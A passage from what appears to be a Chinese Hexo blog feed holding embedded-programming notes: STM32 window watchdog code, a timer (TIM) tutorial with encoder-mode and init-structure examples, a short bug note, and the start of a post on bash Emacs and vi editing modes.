class="hljs-type">void</span> <span class="hljs-title function_">WWDG_Config</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> tr, <span class="hljs-type">uint8_t</span> wr, <span class="hljs-type">uint32_t</span> prv)</span><br>&#123;<br><span class="hljs-comment">// 开启 WWDG 时钟</span><br>RCC_APB1PeriphClockCmd(RCC_APB1Periph_WWDG, ENABLE);<br><br><span class="hljs-comment">// 设置递减计数器的值</span><br>WWDG_SetCounter( tr );<br><br><span class="hljs-comment">// 设置预分频器的值</span><br>WWDG_SetPrescaler( prv );<br><br><span class="hljs-comment">// 设置上窗口值</span><br>WWDG_SetWindowValue( wr );<br><br><span class="hljs-comment">// 设置计数器的值，使能WWDG</span><br>WWDG_Enable(WWDG_CNT);<br><br><span class="hljs-comment">// 清除提前唤醒中断标志位</span><br>WWDG_ClearFlag();<br><span class="hljs-comment">// 配置WWDG中断优先级</span><br>WWDG_NVIC_Config();<br><span class="hljs-comment">// 开WWDG 中断</span><br>WWDG_EnableIT();<br>&#125;<br><br><span class="hljs-comment">// 喂狗</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_Feed</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// 喂狗，刷新递减计数器的值，设置成最大WDG_CNT=0X7F</span><br>WWDG_SetCounter( WWDG_CNT );<br>&#125;<br><br><span class="hljs-comment">// WWDG 中断复服务程序，如果发生了此中断，表示程序已经出现了故障，</span><br><span class="hljs-comment">// 这是一个死前中断。在此中断服务程序中应该干最重要的事，</span><br><span class="hljs-comment">// 比如保存重要的数据等，这个时间具体有多长，要</span><br><span class="hljs-comment">// 由WDGTB的值决定：</span><br><span class="hljs-comment">// WDGTB:0   113us</span><br><span class="hljs-comment">// WDGTB:1   227us</span><br><span class="hljs-comment">// WDGTB:2   455us</span><br><span class="hljs-comment">// WDGTB:3   910us</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_IRQHandler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    WWDG_ClearFlag();<br>    <span class="hljs-comment">//死前中断, 在这里要做最重要的事情, 如保存好数据信息</span><br>&#125;<br></code></pre></td></tr></table></figure><p>由上可以看到窗口看门狗在发生中断后可以留有一定的时间来让程序做好保存的工作，那么这个时间是多久这个是位<code>WDGTB</code>来决定的。</p><p>具体的计算公式为；<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401091314844.png"></p><ul><li>Twwdg：WWDG超时时间（单位为ms）</li><li>Fpclk1：APB1的时钟频率（单位为Khz）</li><li>WDGTB：WWDG的预分频系数</li><li>T[5:0]：窗口看门狗的计数器低6位</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stm32编码错题集</title>
    <link href="/2023/12/27/stm32%E7%BC%96%E7%A0%81%E9%94%99%E9%A2%98%E9%9B%86/"/>
    <url>/2023/12/27/stm32%E7%BC%96%E7%A0%81%E9%94%99%E9%A2%98%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>记录在写stm32相关代码的时候出现的错误以及解决方法</p><span id="more"></span> <ul><li><p>程序执行到NVIC_Init()这个函数的时候总是无法继续执行</p><p>  解决方法：是我的<code>void USART1_IRQHandler(void)</code>中断函数名写错了，将其写成了<code>void USART1_IQRHandler(void)</code></p><p>  总结：每次写这些具有强制性的函数名的时候一定要仔细查看函数名是否符合要求。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的TIM</title>
    <link href="/2023/12/27/stm32%E4%B8%AD%E7%9A%84TIM/"/>
    <url>/2023/12/27/stm32%E4%B8%AD%E7%9A%84TIM/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的TIM外设</p><span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在stm32f103中有三种TIM，通用TIM、基本TIM、高级TIM。具体如下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312271543993.png"></p><h2 id="基本定时器"><a href="#基本定时器" class="headerlink" title="基本定时器"></a>基本定时器</h2><p>这种定时器是最简单的定时器，其结构简图如下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312271545588.png"></p><p>在stm32F10x系列的芯片中基本定时器包括：</p><ul><li>TIM6</li><li>TIM7</li></ul><p>基本定时器TIM6和TIM7各包含一个16位自动装载计数器，由各自的可编程预分频器驱动。</p><p>它们可以作为通用定时器提供时间基准，特别地可以为数模转换器(DAC)提供时钟。实际上，它们在芯片内部直接连接到DAC并通过触发输出直接驱动DAC。</p><p>如何计时的：<br>我们把定时器设置自动重装载寄存器 ARR 的值为 1000，设置时钟预分频器为 71， 则驱动计数器的时钟：CK_CNT &#x3D; CK_INT &#x2F; (71+1)&#x3D;1M， 则计数器计数一次的时间等于：1&#x2F;CK_CNT&#x3D;1us，当计数器计数到 ARR 的值 1000时， 产生一次中断，则中断一次的时间为：1&#x2F;CK_CNT*ARR&#x3D;1ms。</p><h3 id="基本定时器编程"><a href="#基本定时器编程" class="headerlink" title="基本定时器编程"></a>基本定时器编程</h3><p>初始化结构体定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    TIM_Prescaler            <span class="hljs-comment">// 都有</span><br>    TIM_CounterMode          <span class="hljs-comment">// TIMx,x[6,7]没有，其他都有</span><br>    TIM_Period               <span class="hljs-comment">// 都有</span><br>    TIM_ClockDivision        <span class="hljs-comment">// TIMx,x[6,7]没有，其他都有</span><br>    TIM_RepetitionCounter    <span class="hljs-comment">// TIMx,x[1,8,15,16,17]才有</span><br>&#125; TIM_TimeBaseInitTypeDef;<br></code></pre></td></tr></table></figure><p>其中 TIM15&#x2F;16&#x2F;17 只存在与互联型产品中，在 F1 大&#x2F;中&#x2F;小容量型号中没有。</p><h1 id="高级定时器"><a href="#高级定时器" class="headerlink" title="高级定时器"></a>高级定时器</h1><p>**高级控制定时器(TIM1和TIM8)**和通用定时器在基本定时器的基础上引入了外部引脚，可以实现输入捕获和输出比较功能。 高级控制定时器比通用定时器增加了可编程死区互补输出、重复计数器、带刹车(断路)功能，这些功能都是针对工业电机控制方面。 </p><p>高级控制定时器时基单元包含</p><ul><li>一个16位自动重装载寄存器ARR</li><li>一个16位的计数器CNT，可向上&#x2F;下计数</li><li>一个16位可编程预分频器PSC</li></ul><p>预分频器时钟源有多种可选，有内部的时钟、外部时钟。还有一个8位的重复计数器RCR，这样最高可实现40位的可编程定时。</p><p>想要搞懂高级定时器就一定需要看懂其框图，如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090203808.png"></p><p>这个框图中包含了高级定时器中所有功能的实现逻辑。</p><h2 id="高级定时器的时钟源"><a href="#高级定时器的时钟源" class="headerlink" title="高级定时器的时钟源"></a>高级定时器的时钟源</h2><p>高级定时器时钟来源有：</p><ul><li>内部时钟源<code>CK_INT</code></li><li>内部触发输入<code>ITRx</code></li><li>外部时钟输入一：外部输入引脚<code>TIx(x=1 2 3 4)</code></li><li>外部时钟输入二：外部触发输入<code>ETR</code></li></ul><h3 id="内部时钟源"><a href="#内部时钟源" class="headerlink" title="内部时钟源"></a>内部时钟源</h3><p>内部时钟CK_INT即来自于芯片内部，等于72M，一般情况下，我们都是使用内部时钟。当从模式控制寄存器TIMx_SMCR的SMS位等于000时，则使用内部时钟。</p><h3 id="内部触发输入"><a href="#内部触发输入" class="headerlink" title="内部触发输入"></a>内部触发输入</h3><p>内部触发输入是使用一个定时器作为另一个定时器的预分频器。硬件上高级控制定时器和通用定时器在内部连接在一起， 可以实现定时器同步或级联。主模式的定时器可以对从模式定时器执行复位、启动、停止或提供时钟。</p><h3 id="外部时钟输入一"><a href="#外部时钟输入一" class="headerlink" title="外部时钟输入一"></a>外部时钟输入一</h3><h3 id="外部时钟输入二"><a href="#外部时钟输入二" class="headerlink" title="外部时钟输入二"></a>外部时钟输入二</h3><h2 id="如何使用–模式"><a href="#如何使用–模式" class="headerlink" title="如何使用–模式"></a>如何使用–模式</h2><p>使用TIM其实就是使用其不同的模式，TIM提供了下列模式：</p><ul><li>输出比较模式</li><li>输入捕获模式</li><li>编码器接口模式</li><li>PWMI（PWM输出模式）</li><li>PWM模式</li><li>强制输出模式</li></ul><p>下面我们详细讲一讲这些模式的电路图和使用方法，<strong>注意这些内容都在用户手册中有定义</strong></p><h3 id="输出比较模式"><a href="#输出比较模式" class="headerlink" title="输出比较模式"></a>输出比较模式</h3><p>输出比较模式的工作原理：</p><p>即使根据<code>CNT</code>和<code>CCR</code>之间的大小关系来输出高低电平。通过配置<code>TIMx_CCMR1</code>寄存器。输出比较模式又可以选择八种模式，这个八种模式在下面的图中可以找到其中PWM模式1是输出比较模式中最常用的模式之一，主要用来生成PWM波形，用以驱动电机。</p><p>首先我们来看看这个模式的框图：</p><p>通用TIM框图<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090314245.png"><br>高级TIM框图<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090314080.png"></p><p>可以看到图中有一个输出模式控制器，我们可以通过<code>TIMx_CCMR1</code>这个寄存器来对其进行控制，可以选择的模式如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090316997.png"></p><p>我们使用最多的就是PWM模式，实际上PWM模式1和2是一样的。</p><p>输出PWM波形的数据计算公式：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090319756.png"></p><p>其中<code>CK_PSC</code>就是计数器时钟，一般是<code>72Mhz</code>。看你选的是哪个时钟作为其时钟源。TIMx_ARR寄存器确定频率、由TIMx_CCRx寄存器确定占空比的信号。</p><h3 id="输入捕获模式"><a href="#输入捕获模式" class="headerlink" title="输入捕获模式"></a>输入捕获模式</h3><p>这个模式主要被用来测量PWM的各种参数–占空比、频率、分辨率等等参数</p><h3 id="编码器接口模式"><a href="#编码器接口模式" class="headerlink" title="编码器接口模式"></a>编码器接口模式</h3><p><strong>编码器接口模式的工作原理</strong></p><p>根据下图中的两个引脚的输入，自动控制CNT计数器的自增、自减。以此来判断编码器的位置、速度、旋转方向。如何根据引脚的输入来判断计数器是加还是减：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090239040.png"><br>一般我们使用的有效边沿是在TI1和TI2计数。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090231718.png"></p><p>根据上面的图，编码器接口处有两根线，受到了两个不同的引脚的控制。 为什么需要受控于两个不同的引脚，实际上这有利消除信号源的毛刺（噪声）：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090234065.png"></p><p>根据表格，可以查出当出现了毛刺的时候，计数器中的值实际上是没有改变的。这个消除了由于毛刺带来的误差。</p><p>并且编码器接口模式是使用了输入滤波器和边沿检测器（实际上这里是极性选择，而不是边沿检测）</p><p>编码器接口模式特点如下：</p><ul><li>编码器接口可接收增量（正交）编码器的信号，根据编码器旋转产生的正交信号脉冲，自动控制CNT自增或自减，从而指示编码器的位置、旋转方向和旋转速度</li><li>两个输入引脚借用了输入捕获的通道1和通道2</li><li>这个模式只有高级定时器和通用定时器才会有<strong>一个</strong>，所以普通定时器是没有这个模式的。</li></ul><p>编码器接口模式基本上相当于使用了一个带有方向选择的外部时钟。这意味着计数器只在0到TIMx_ARR寄存器的自动装载值之间连续计数(根据方向，或是0到ARR计数，或是ARR到0计数)。所以在开始计数之前必须配置TIMx_ARR；同样，捕获器、比较器、预分频器、重复计数器、触发输出特性等仍工作如常。、</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在手册中有一个列子。我们通过学习这个例子可以知道这个模式大致如何使用。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090302530.png"></p><p>根据上图中的配置步骤，我们可以知道使用该模式需要做： </p><ol><li>GPIO配置</li><li>选择两个通道的极性（即是否反向）</li><li>配置有效边沿</li><li>使能计数器</li></ol><p>下面，我们使用标准库来进行编程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Encoder_Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/*开启时钟*/</span><br>RCC_APB1PeriphClockCmd(RCC_APB1Periph_TIM3, ENABLE);<span class="hljs-comment">//开启TIM3的时钟</span><br>RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);<span class="hljs-comment">//开启GPIOA的时钟</span><br><br><span class="hljs-comment">/*GPIO初始化*/</span><br>GPIO_InitTypeDef GPIO_InitStructure;<br>GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IPU;<br>GPIO_InitStructure.GPIO_Pin = GPIO_Pin_6 | GPIO_Pin_7;<br>GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;<br>GPIO_Init(GPIOA, &amp;GPIO_InitStructure);<span class="hljs-comment">//将PA6和PA7引脚初始化为上拉输入</span><br><br><span class="hljs-comment">/*时基单元初始化*/</span><br>TIM_TimeBaseInitTypeDef TIM_TimeBaseInitStructure;<span class="hljs-comment">//定义结构体变量</span><br>TIM_TimeBaseInitStructure.TIM_ClockDivision = TIM_CKD_DIV1;     <span class="hljs-comment">//时钟分频，选择不分频，此参数用于配置滤波器时钟，不影响时基单元功能</span><br>TIM_TimeBaseInitStructure.TIM_CounterMode = TIM_CounterMode_Up; <span class="hljs-comment">//计数器模式，选择向上计数</span><br>TIM_TimeBaseInitStructure.TIM_Period = <span class="hljs-number">65536</span> - <span class="hljs-number">1</span>;               <span class="hljs-comment">//计数周期，即ARR的值</span><br>TIM_TimeBaseInitStructure.TIM_Prescaler = <span class="hljs-number">1</span> - <span class="hljs-number">1</span>;                <span class="hljs-comment">//预分频器，即PSC的值</span><br>TIM_TimeBaseInitStructure.TIM_RepetitionCounter = <span class="hljs-number">0</span>;            <span class="hljs-comment">//重复计数器，高级定时器才会用到</span><br>TIM_TimeBaseInit(TIM3, &amp;TIM_TimeBaseInitStructure);             <span class="hljs-comment">//将结构体变量交给TIM_TimeBaseInit，配置TIM3的时基单元</span><br><br><span class="hljs-comment">/*输入捕获初始化*/</span><br>TIM_ICInitTypeDef TIM_ICInitStructure;<span class="hljs-comment">//定义结构体变量</span><br>TIM_ICStructInit(&amp;TIM_ICInitStructure);<span class="hljs-comment">//结构体初始化，若结构体没有完整赋值</span><br><span class="hljs-comment">//则最好执行此函数，给结构体所有成员都赋一个默认值</span><br><span class="hljs-comment">//避免结构体初值不确定的问题</span><br>TIM_ICInitStructure.TIM_Channel = TIM_Channel_1;<span class="hljs-comment">//选择配置定时器通道1</span><br>TIM_ICInitStructure.TIM_ICFilter = <span class="hljs-number">0xF</span>;<span class="hljs-comment">//输入滤波器参数，可以过滤信号抖动</span><br>TIM_ICInit(TIM3, &amp;TIM_ICInitStructure);<span class="hljs-comment">//将结构体变量交给TIM_ICInit，配置TIM3的输入捕获通道</span><br>TIM_ICInitStructure.TIM_Channel = TIM_Channel_2;<span class="hljs-comment">//选择配置定时器通道2</span><br>TIM_ICInitStructure.TIM_ICFilter = <span class="hljs-number">0xF</span>;<span class="hljs-comment">//输入滤波器参数，可以过滤信号抖动</span><br>TIM_ICInit(TIM3, &amp;TIM_ICInitStructure);<span class="hljs-comment">//将结构体变量交给TIM_ICInit，配置TIM3的输入捕获通道</span><br><br><span class="hljs-comment">/*编码器接口配置*/</span><br>TIM_EncoderInterfaceConfig(TIM3, TIM_EncoderMode_TI12, TIM_ICPolarity_Rising, TIM_ICPolarity_Rising);<br><span class="hljs-comment">//配置编码器模式以及两个输入通道是否反相</span><br><span class="hljs-comment">//注意此时参数的Rising和Falling已经不代表上升沿和下降沿了，而是代表是否反相</span><br><span class="hljs-comment">//此函数必须在输入捕获初始化之后进行，否则输入捕获的配置会覆盖此函数的部分配置</span><br><br><span class="hljs-comment">/*TIM使能*/</span><br>TIM_Cmd(TIM3, ENABLE);<span class="hljs-comment">//使能TIM3，定时器开始运行</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中，最主要的函数<code>TIM_EncoderInterfaceConfig()</code>主要三个参数的含义是：</p><ul><li>第一个，选择是哪个TIM</li><li>第二个，选择通道一的极性<ul><li>@arg TIM_ICPolarity_Falling: IC Falling edge.选这个就是不反向，反之反向</li><li>@arg TIM_ICPolarity_Rising: IC Rising edge.</li></ul></li><li>第三个，选择通道二的极性</li></ul><p>其实这个函数的最后面的两个参数在配置<code>TIM_ICInitTypeDef</code>结构体的时候就可以初始化了。在这个函数中初始化也是一样的效果，这就是为什么没有在<code>TIM_ICInitTypeDef</code>中初始化它。</p><p>对此我们可以总结编码器接口模式下的配置图：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402090325511.png"></p><h1 id="编程相关"><a href="#编程相关" class="headerlink" title="编程相关"></a>编程相关</h1><p>在标准库函数头文件stm32f10x_tim.h中对定时器外设建立了四个初始化结构体，分别为：</p><ul><li>时基初始化结构体<code>TIM_TimeBaseInitTypeDef</code></li><li>输出比较初始化结构体<code>TIM_OCInitTypeDef</code></li><li>输入捕获初始化结构体<code>TIM_ICInitTypeDef</code></li><li>断路和死区初始化结构体<code>TIM_BDTRInitTypeDef</code>。</li></ul><p>高级控制定时器可以用到所有初始化结构体，通用定时器不能使用<code>TIM_BDTRInitTypeDef</code>结构体， 基本定时器只能使用时基结构体。</p><h2 id="时基初始化结构体"><a href="#时基初始化结构体" class="headerlink" title="时基初始化结构体"></a>时基初始化结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> TIM_Prescaler;          <span class="hljs-comment">// 预分频器</span><br>    <span class="hljs-type">uint16_t</span> TIM_CounterMode;        <span class="hljs-comment">// 计数模式</span><br>    <span class="hljs-type">uint32_t</span> TIM_Period;             <span class="hljs-comment">// 定时器周期</span><br>    <span class="hljs-type">uint16_t</span> TIM_ClockDivision;      <span class="hljs-comment">// 时钟分频</span><br>    <span class="hljs-type">uint8_t</span> TIM_RepetitionCounter;   <span class="hljs-comment">// 重复计算器</span><br>&#125; TIM_TimeBaseInitTypeDef;<br></code></pre></td></tr></table></figure><p>需要注意的是，根据TIM种类的不同，时基结构体中的成员是不一样的：</p><ul><li>基本TIM类型中，只有时基结构体中的<strong>预分频器</strong>和自动重载值，就是上面的定时器周期</li><li>通用TIM类型中，</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span> TIM_Prescaler            都有<br>  TIM_CounterMode   TIMx,x[<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]没有，其他都有<br>  TIM_Period               都有<br>  TIM_ClockDivision        TIMx,x[<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]没有，其他都有<br>  TIM_RepetitionCounter    TIMx,x[<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>]才有<br>&#125;TIM_TimeBaseInitTypeDef; <br></code></pre></td></tr></table></figure><h2 id="输出比较结构体"><a href="#输出比较结构体" class="headerlink" title="输出比较结构体"></a>输出比较结构体</h2><p>输出比较结构体<code>TIM_OCInitTypeDef</code>用于输出比较模式，与<code>TIM_OCxInit</code>函数配合使用完成指定定时器输出通道初始化配置。<strong>高级控制定时器有四个定时器通道，使用时都必须单独设置。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> TIM_OCMode;        <span class="hljs-comment">// 比较输出模式</span><br>    <span class="hljs-type">uint16_t</span> TIM_OutputState;   <span class="hljs-comment">// 比较输出使能</span><br>    <span class="hljs-type">uint16_t</span> TIM_OutputNState;  <span class="hljs-comment">// 比较互补输出使能</span><br>    <span class="hljs-type">uint32_t</span> TIM_Pulse;         <span class="hljs-comment">// 脉冲宽度</span><br>    <span class="hljs-type">uint16_t</span> TIM_OCPolarity;    <span class="hljs-comment">// 输出极性</span><br>    <span class="hljs-type">uint16_t</span> TIM_OCNPolarity;   <span class="hljs-comment">// 互补输出极性</span><br>    <span class="hljs-type">uint16_t</span> TIM_OCIdleState;   <span class="hljs-comment">// 空闲状态下比较输出状态</span><br>    <span class="hljs-type">uint16_t</span> TIM_OCNIdleState;  <span class="hljs-comment">// 空闲状态下比较互补输出状态</span><br>&#125; TIM_OCInitTypeDef;<br></code></pre></td></tr></table></figure><p>具体的含义如下：</p><p>(1) TIM_OCMode： 比较输出模式选择，总共有八种，常用的为PWM1&#x2F;PWM2。它设定CCMRx寄存器OCxM[2:0]位的值。</p><p>(2) TIM_OutputState： 比较输出使能，决定最终的输出比较信号OCx是否通过外部引脚输出。它设定TIMx_CCER寄存器CCxE&#x2F;CCxNE位的值。</p><p>(3) TIM_OutputNState: 比较互补输出使能，决定OCx的互补信号OCxN是否通过外部引脚输出。它设定CCER寄存器CCxNE位的值。</p><p>(4) TIM_Pulse： 比较输出脉冲宽度，实际设定比较寄存器CCR的值，决定脉冲宽度。可设置范围为0至65535。</p><p>(5) TIM_OCPolarity： 比较输出极性，可选OCx为高电平有效或低电平有效。它决定着定时器通道有效电平。它设定CCER寄存器的CCxP位的值。</p><p>(6) TIM_OCNPolarity： 比较互补输出极性，可选OCxN为高电平有效或低电平有效。它设定TIMx_CCER寄存器的CCxNP位的值。</p><p>(7) TIM_OCIdleState： 空闲状态时通道输出电平设置，可选输出1或输出0，即在空闲状态(BDTR_MOE位为0)时，经过死区时间后定时器通道输出高电平或低电平。它设定CR2寄存器的OISx位的值。</p><p>(8) TIM_OCNIdleState： 空闲状态时互补通道输出电平设置，可选输出1或输出0，即在空闲状态(BDTR_MOE位为0)时，经过死区时间后定时器互补通道输出高电平或低电平， 设定值必须与TIM_OCIdleState相反。它设定是CR2寄存器的OISxN位的值。</p><h2 id="输入捕获结构体"><a href="#输入捕获结构体" class="headerlink" title="输入捕获结构体"></a>输入捕获结构体</h2><p>输入捕获结构体<code>TIM_ICInitTypeDef</code>用于输入捕获模式，与<code>TIM_ICInit</code>函数配合使用完成定时器输入通道初始化配置。 如果使用PWM输入模式需要与<code>TIM_PWMIConfig</code>函数配合使用完成定时器输入通道初始化配置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> TIM_Channel;      <span class="hljs-comment">// 输入通道选择</span><br>    <span class="hljs-type">uint16_t</span> TIM_ICPolarity;   <span class="hljs-comment">// 输入捕获触发选择</span><br>    <span class="hljs-type">uint16_t</span> TIM_ICSelection;  <span class="hljs-comment">// 输入捕获选择</span><br>    <span class="hljs-type">uint16_t</span> TIM_ICPrescaler;  <span class="hljs-comment">// 输入捕获预分频器</span><br>    <span class="hljs-type">uint16_t</span> TIM_ICFilter;     <span class="hljs-comment">// 输入捕获滤波器</span><br>&#125; TIM_ICInitTypeDef;<br></code></pre></td></tr></table></figure><h2 id="断路和死区结构体"><a href="#断路和死区结构体" class="headerlink" title="断路和死区结构体"></a>断路和死区结构体</h2><p>断路和死区结构体TIM_BDTRInitTypeDef用于断路和死区参数的设置，属于高级定时器专用，用于配置断路时通道输出状态，以及死区时间。 它与TIM_BDTRConfig函数配置使用完成参数配置。这个结构体的成员只对应BDTR这个寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> TIM_OSSRState;        <span class="hljs-comment">// 运行模式下的关闭状态选择</span><br>    <span class="hljs-type">uint16_t</span> TIM_OSSIState;        <span class="hljs-comment">// 空闲模式下的关闭状态选择</span><br>    <span class="hljs-type">uint16_t</span> TIM_LOCKLevel;        <span class="hljs-comment">// 锁定配置</span><br>    <span class="hljs-type">uint16_t</span> TIM_DeadTime;         <span class="hljs-comment">// 死区时间</span><br>    <span class="hljs-type">uint16_t</span> TIM_Break;            <span class="hljs-comment">// 断路输入使能控制</span><br>    <span class="hljs-type">uint16_t</span> TIM_BreakPolarity;    <span class="hljs-comment">// 断路输入极性</span><br>    <span class="hljs-type">uint16_t</span> TIM_AutomaticOutput;  <span class="hljs-comment">// 自动输出使能</span><br>&#125; TIM_BDTRInitTypeDef;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>内核外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash中的两种模式</title>
    <link href="/2023/12/26/bash%E4%B8%AD%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/"/>
    <url>/2023/12/26/bash%E4%B8%AD%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>bash中的vi模式和Emacs模式</p><span id="more"></span><h1 id="Emacs模式"><a href="#Emacs模式" class="headerlink" title="Emacs模式"></a>Emacs模式</h1><p>首先bash默认的就是这个模式，我们所熟知的快捷键也是这个模式的如：</p><pre><code class="hljs">ALT+A – 光标移动到行首。  ALT+B – 光标移动到所在单词词首。  ALT+C – 终止正在运行的命令/进程。与 CTRL+C 相同。  ALT+D – 关闭空的终端（也就是它会关闭没有输入的终端）。也删除光标后的全部字符。  ALT+F – 移动到光标所在单词词末。  ALT+T – 交换最后两个单词。  ALT+U – 将单词内光标后的字母转为大写。  ALT+L – 将单词内光标后的字母转为小写。  ALT+R – 撤销对从历史记录中带来的命令的修改。  正如你在上面输出所见，我使用反向搜索拉取了一个指令，并更改了那个指令的最后一个字母，并使用 ALT+R 撤销了更改。    ALT+. （注意末尾的点号） – 使用上一条命令的最后一个单词。  CTRL+R – 向后搜索历史记录（反向搜索）。 CTRL+S – 向前搜索历史记录。CTRL+M – 和 CTRL+J 或 RETURN键相同。CTRL+W – 删除光标前的一个单词。CTRL+XX – 移动到行首位置（再移动回来）。CTRL+Y – 恢复你上一个删除或剪切的条目。CTRL+[ – 和 ESC 键等同。CTRL+H – 删除光标前的一个字符，和退格键相同。CTRL+D – 删除光标后的一个字符。</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://linux.cn/article-9430-1.html">https://linux.cn/article-9430-1.html</a></p><h1 id="vi模式"><a href="#vi模式" class="headerlink" title="vi模式"></a>vi模式</h1><p>切换到vi模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#./.bashrc</span><br><span class="hljs-built_in">set</span> -o vi 